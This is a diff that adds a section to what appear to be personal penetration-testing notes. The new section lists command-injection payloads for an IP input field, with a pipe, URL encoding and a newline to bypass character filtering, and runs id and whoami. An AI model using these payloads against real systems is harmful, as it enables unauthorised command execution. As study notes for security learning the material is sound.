@@ -429,7 +429,22 @@ php -S 0.0.0.0:80
 - 
 ## [II. Mimikatz](/Notes/mimi.md)
 
-
-
-
 # [22. BurpSuite](/burpsuite.md)
+
+
+# IP Input Field
+```sh
+ip=127.0.0.1|id
+##web server probably filtered out  Likely filtering special characters like `|`, `;`, etc.
+
+##Encoding 
+%7C%20id
+
+##Smart Bypass Using Newline Payload:
+%0a whoami        #%0a is the URL-encoded value for a newline character (\n).
+127.0.0.1%0awhoami
+
+#It becomes:
+ping 127.0.0.1
+whoami
+```
